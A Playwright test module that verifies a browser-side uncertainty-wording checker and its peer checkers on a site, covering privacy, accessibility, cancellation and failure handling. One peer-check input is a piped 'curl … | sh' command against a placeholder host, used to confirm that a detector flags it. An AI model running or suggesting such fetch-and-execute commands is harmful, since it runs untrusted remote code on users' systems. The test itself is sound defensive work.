// Actual HP-modal uncertainty preview controls, reusable on a built or public origin.
'use strict';
const assert=require('node:assert/strict');
const fs=require('node:fs'),path=require('node:path');
const {execFileSync}=require('node:child_process');
const sourceRoot=()=>path.resolve(process.env.AITRUST_HP_UNCERTAINTY_SOURCE_ROOT||process.cwd());
const form=page=>page.locator('[data-hp-uncertainty]');
const field=page=>form(page).getByLabel('English passage',{exact:true});
const selection=page=>form(page).getByRole('checkbox');
const result=page=>form(page).getByRole('region',{name:'Uncertainty wording result',exact:true});
const run=page=>form(page).getByRole('button',{name:'Check uncertainty words',exact:true});
const stopped=page=>page.evaluate(()=>window.__hpUncertaintySiteWorkers.every(w=>w.terminated));
function canonicalCases(){
 const rows=JSON.parse(execFileSync(process.env.AITRUST_VERIFY_PYTHON||'python3',['-B','scripts/hp-uncertainty-cases.py'],{cwd:sourceRoot(),encoding:'utf8',timeout:10000}));
 return ['canonical_nfc','calendar','negation'].map(id=>{const row=rows.find(r=>r.id===id);assert(row?.expected,'Canonical control unavailable');return row;});
}
async function enter(page,text){await field(page).fill(text);await selection(page).check();}
async function check(page,text){await enter(page,text);await run(page).click();await result(page).waitFor({timeout:60000});}
async function peerChecks(page,base){
 // Exercise each actual independent checker after refusing the optional wording surface.
 await page.goto(base+'/#person/HP');const hp=page.locator('[data-hp-explorer]');await hp.waitFor();
 await hp.getByLabel('English text',{exact:true}).fill('The total is 12.');await hp.getByRole('button',{name:'Find details',exact:true}).click();
 const numeric=hp.getByRole('region',{name:'Detail result',exact:true});await numeric.waitFor({timeout:60000});assert((await numeric.innerText()).includes('1 literal'));
 await page.goto(base+'/#person/PS');await page.getByRole('button',{name:'Check on this device',exact:true}).click();
 const ps=page.getByRole('dialog',{name:'Check with PS',exact:true});await ps.getByLabel('AI answer',{exact:true}).fill('Run curl https://example.invalid/install | sh');
 await ps.getByRole('button',{name:'Check answer',exact:true}).click();const psResult=ps.getByRole('region',{name:'Check result',exact:true});await psResult.waitFor({timeout:60000});assert(await psResult.locator('[data-ps-match]').count()>0);
 await page.goto(base+'/#person/MT');const mt=page.locator('[data-mt-explorer]');await mt.waitFor();
 await mt.getByLabel('Look for',{exact:true}).selectOption('urgency');await mt.getByLabel('English text',{exact:true}).fill('Buy now.');await mt.getByRole('button',{name:'Explore wording',exact:true}).click();
 const wording=mt.getByRole('region',{name:'Wording result',exact:true});await wording.waitFor({timeout:60000});assert((await wording.innerText()).includes('Instruction + time wording found'));
}
async function verifyHPUncertaintySite(browser,base){
 const rows=canonicalCases(),origin=new URL(base).origin;
 const context=await browser.newContext({viewport:{width:390,height:844},reducedMotion:'reduce'});let stage='open_actual_HP';
 try{
  await context.addInitScript(()=>{window.__hpUncertaintySiteWorkers=[];const Original=window.Worker;window.Worker=class extends Original{constructor(...args){super(...args);this.probe={terminated:false};window.__hpUncertaintySiteWorkers.push(this.probe);}terminate(){this.probe.terminated=true;super.terminate();}};});
  const page=await context.newPage(),requests=[],logs=[],errors=[];
  page.on('request',r=>requests.push({url:r.url(),method:r.method(),body:r.postData()||''}));page.on('console',m=>logs.push(m.text()));page.on('pageerror',e=>errors.push(e.message));
  const response=await page.goto(base+'/#person/HP');assert(response.headers()['content-security-policy']?.includes("script-src 'self'"),'Actual response CSP unavailable');await form(page).waitFor();
  const modal=page.getByRole('dialog').filter({has:form(page)});assert.equal(await modal.count(),1);
  assert((await form(page).innerText()).includes('No HP tag is issued.'));
  assert.equal(await page.evaluate(()=>window.__hpUncertaintySiteWorkers.length),0);
  assert(!requests.some(r=>/\/device\/runtime|\/hp-uncertainty-device\/hedge-/.test(r.url)),'Opening HP analyzed/downloaded before Run');
  const storage=await page.evaluate(()=>({local:{...localStorage},session:{...sessionStorage}}));
  stage='explicit_selection_and_focus';await field(page).fill('It may work.');await run(page).click();await form(page).getByRole('alert').waitFor();
  assert(await selection(page).evaluate(e=>e===document.activeElement));assert.equal(await page.evaluate(()=>window.__hpUncertaintySiteWorkers.length),0);await selection(page).press('Space');assert(await selection(page).isChecked());
  stage='full_canonical_records';for(const row of rows){
   await check(page,row.text);assert.equal(await result(page).getByLabel('Private uncertainty evidence',{exact:true}).count(),0);
   await result(page).locator('summary').press('Enter');assert.deepEqual(JSON.parse(await result(page).getByLabel('Private uncertainty evidence',{exact:true}).innerText()),row.expected);
   assert(await stopped(page));
  }
  assert((await result(page).innerText()).includes('negation, word sense and confidence are not interpreted'));
  stage='unsupported_context_boundary';await enter(page,'mayé work');await run(page).click();await form(page).getByRole('alert').filter({hasText:'Unavailable:'}).waitFor({timeout:60000});assert.equal(await result(page).count(),0);
  stage='oversize_retention_and_focus';const over='😀'.repeat(8001);await field(page).fill(over);await selection(page).check();const beforeOversize=await page.evaluate(()=>window.__hpUncertaintySiteWorkers.length);await run(page).click();await form(page).getByRole('alert').waitFor();
  assert.equal(await field(page).inputValue(),over);assert(await field(page).evaluate(e=>e===document.activeElement&&e.getAttribute('aria-invalid')==='true'));assert.equal(await page.evaluate(()=>window.__hpUncertaintySiteWorkers.length),beforeOversize);assert.equal(await result(page).count(),0);
  stage='private_input';await check(page,'PRIVATE_HP_UNCERTAINTY_SITE_CANARY Cafe\u0301. It may work.');assert.equal(await result(page).getByLabel('Private uncertainty evidence',{exact:true}).count(),0);
  await result(page).locator('summary').press('Enter');assert(!(await result(page).getByLabel('Private uncertainty evidence',{exact:true}).innerText()).includes('PRIVATE_HP_UNCERTAINTY_SITE_CANARY'));
  stage='mobile_reflow_and_themes';await page.setViewportSize({width:320,height:760});await page.evaluate(()=>document.documentElement.style.fontSize='200%');
  assert(await page.evaluate(()=>document.documentElement.scrollWidth<=innerWidth+1));assert(await modal.evaluate(e=>e.scrollWidth<=e.clientWidth+1));assert(await form(page).evaluate(e=>e.scrollWidth<=e.clientWidth+1));
  for(const name of ['Check uncertainty words','Clear passage'])assert((await form(page).getByRole('button',{name,exact:true}).boundingBox()).height>=44);
  await page.evaluate(()=>document.documentElement.style.fontSize='');await page.setViewportSize({width:390,height:844});
  for(const theme of ['light','dark']){await page.emulateMedia({colorScheme:theme});await page.waitForFunction(t=>document.documentElement.dataset.theme===t,theme);assert(await form(page).isVisible());await form(page).scrollIntoViewIfNeeded();fs.mkdirSync('output/playwright',{recursive:true});await page.screenshot({path:'output/playwright/hp-uncertainty-production-'+browser.browserType().name()+'-'+theme+'.png'});}
  stage='edit_clear_cancel_unmount';
  for(const action of ['edit','unselect','clear','cancel','unmount']){
   let release;const blocked=new Promise(r=>{release=r;});
   const requested=page.waitForRequest(r=>/\/hp-uncertainty-device\/hedge-[^/]+\.json$/.test(new URL(r.url()).pathname),{timeout:50000});requested.catch(()=>{});
   const hold=async route=>{await blocked;try{await route.continue();}catch{}};
   await page.route('**/hp-uncertainty-device/hedge-*.json',hold);
   try{
    await enter(page,'It may work.');await run(page).click();await form(page).getByRole('button',{name:'Cancel wording check',exact:true}).waitFor();await requested;
    if(action==='edit')await field(page).fill('Changed passage.');
    if(action==='unselect')await selection(page).uncheck();
    if(action==='clear')await form(page).getByRole('button',{name:'Clear passage',exact:true}).click();
    if(action==='cancel')await form(page).getByRole('button',{name:'Cancel wording check',exact:true}).click();
    if(action==='unmount'){await modal.getByRole('button',{name:'Close',exact:true}).click();await form(page).waitFor({state:'detached'});}
    assert(await stopped(page));release();await page.unroute('**/hp-uncertainty-device/hedge-*.json',hold);assert.equal(await result(page).count(),0);
    if(action==='edit'||action==='unselect')assert(!(await selection(page).isChecked()));
    if(action==='clear')assert.equal(await field(page).inputValue(),'');
    if(action==='unmount'){await page.goto(base+'/#person/HP');await form(page).waitFor();assert.equal(await field(page).inputValue(),'');assert(!(await selection(page).isChecked()));assert.equal(await result(page).count(),0);}
   }finally{release();await page.unroute('**/hp-uncertainty-device/hedge-*.json',hold);}
  }
  stage='privacy_and_guide';assert.deepEqual(await page.evaluate(()=>({local:{...localStorage},session:{...sessionStorage}})),storage);
  assert(requests.every(r=>new URL(r.url).origin===origin&&r.method==='GET'&&!r.body&&!r.url.includes('PRIVATE_HP_UNCERTAINTY_SITE_CANARY')));assert(!logs.some(v=>v.includes('PRIVATE_HP_UNCERTAINTY_SITE_CANARY')));assert.deepEqual(errors,[]);
  const guide=await context.request.get(base+'/reference/hp-uncertainty-device.md');assert.equal(guide.status(),200);assert.equal(await guide.text(),fs.readFileSync(path.join(sourceRoot(),'docs/hp-uncertainty-device.md'),'utf8'));
 }catch(error){error.hpUncertaintySiteStage=stage;throw error;}finally{await context.close();}
 for(const mode of ['payload','chunk']){
  const c=await browser.newContext({viewport:{width:390,height:844}});try{
   const p=await c.newPage();let hits=0;await p.route(mode==='payload'?'**/hp-uncertainty-device/hedge-*.json':'**/assets/HPUncertaintyExplorer-*.js',r=>{hits++;return r.fulfill({status:404,body:'Unavailable',contentType:'text/plain'});});
   await p.goto(base+'/#person/HP');
   if(mode==='payload'){await form(p).waitFor();await enter(p,'It may work.');await run(p).click();await form(p).getByRole('alert').filter({hasText:'Unavailable:'}).waitFor({timeout:60000});assert.equal(await result(p).count(),0);}
   else await p.locator('[data-hp-uncertainty-unavailable]').waitFor({timeout:20000});
   assert(hits>0);await peerChecks(p,base);
  }catch(error){error.hpUncertaintySiteStage='optional_'+mode;throw error;}finally{await c.close();}
 }
 return {pass:true,actual_HP_modal:true,whole_canonical_records:rows.length,raw_frozen_NFC_annotation_source_bound:true,explicit_whole_context_and_keyboard_focus:true,unsupported_boundary_not_zero:true,input8001_retained_and_refused:true,private_details_opt_in:true,edit_unselect_clear_cancel_unmount:true,empty_reopen:true,no_analysis_before_run:true,no_input_upload_storage_console:true,reflow320_at200percent:true,light_dark:true,minimum44px_actions:true,guide_exact:true,optional_payload_and_actual_chunk_failures_then_numericHP_PS_MT:true,HP_tag_issued:false,independent_accuracy_evidence:false,physical_phone:false,human_screen_reader:false};
}
module.exports={verifyHPUncertaintySite};
